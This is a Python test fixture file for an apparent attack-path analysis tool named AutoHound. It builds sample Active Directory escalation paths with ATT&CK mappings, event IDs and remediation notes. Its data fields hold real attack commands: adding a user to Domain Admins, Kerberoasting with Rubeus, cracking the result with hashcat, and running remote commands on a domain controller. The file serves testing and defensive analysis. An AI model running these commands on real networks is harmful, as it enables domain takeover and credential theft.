# AutoHound © 2026 Gordon Prescott

"""Sample attack path fixtures for testing."""

from autohound.models import AttackPath, AttackStep, EdgeType


def create_sample_path_1() -> AttackPath:
    """Create a simple attack path."""
    path = AttackPath(
        path_id="sample_1",
        name="GenericAll to Domain Admin",
        description="User has GenericAll on Domain Admins group",
        start_node="lowpriv@domain.local",
        end_node="Domain Admins@domain.local",
        impact_score=95.0,
        stealth_score=50.0,
        complexity_score=20.0
    )
    
    step = AttackStep(
        sequence=1,
        source_node="lowpriv@domain.local",
        target_node="Domain Admins@domain.local",
        technique="Abuse GenericAll to add self to group",
        edge_type=EdgeType.GENERIC_ALL,
        commands=[
            "net group 'Domain Admins' lowpriv /add /domain",
            "Add-DomainGroupMember -Identity 'Domain Admins' -Members lowpriv"
        ],
        attack_technique_id="T1098",
        attack_technique_name="Account Manipulation",
        attack_tactic="Persistence",
        event_ids=["4728", "4732"],
        remediation="Remove unnecessary GenericAll permissions on privileged groups"
    )
    
    path.steps.append(step)
    path.calculate_overall_score()
    
    return path


def create_sample_path_2() -> AttackPath:
    """Create a multi-hop attack path."""
    path = AttackPath(
        path_id="sample_2",
        name="Kerberoast to DA via AdminTo",
        description="Kerberoast service account, then use admin rights to DA",
        start_node="user@domain.local",
        end_node="Domain Admins@domain.local",
        impact_score=90.0,
        stealth_score=70.0,
        complexity_score=60.0
    )
    
    step1 = AttackStep(
        sequence=1,
        source_node="user@domain.local",
        target_node="svc_sql@domain.local",
        technique="Kerberoast service account",
        edge_type=EdgeType.MEMBER_OF,
        commands=[
            "Rubeus.exe kerberoast /user:svc_sql /simple",
            "hashcat -m 13100 hash.txt wordlist.txt"
        ],
        attack_technique_id="T1558.003",
        attack_technique_name="Kerberoasting"
    )
    
    step2 = AttackStep(
        sequence=2,
        source_node="svc_sql@domain.local",
        target_node="DC01@domain.local",
        technique="Abuse AdminTo relationship",
        edge_type=EdgeType.ADMIN_TO,
        commands=[
            "Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }"
        ],
        attack_technique_id="T1021.006",
        attack_technique_name="Remote Services: Windows Remote Management"
    )
    
    path.steps.extend([step1, step2])
    path.calculate_overall_score()
    
    return path
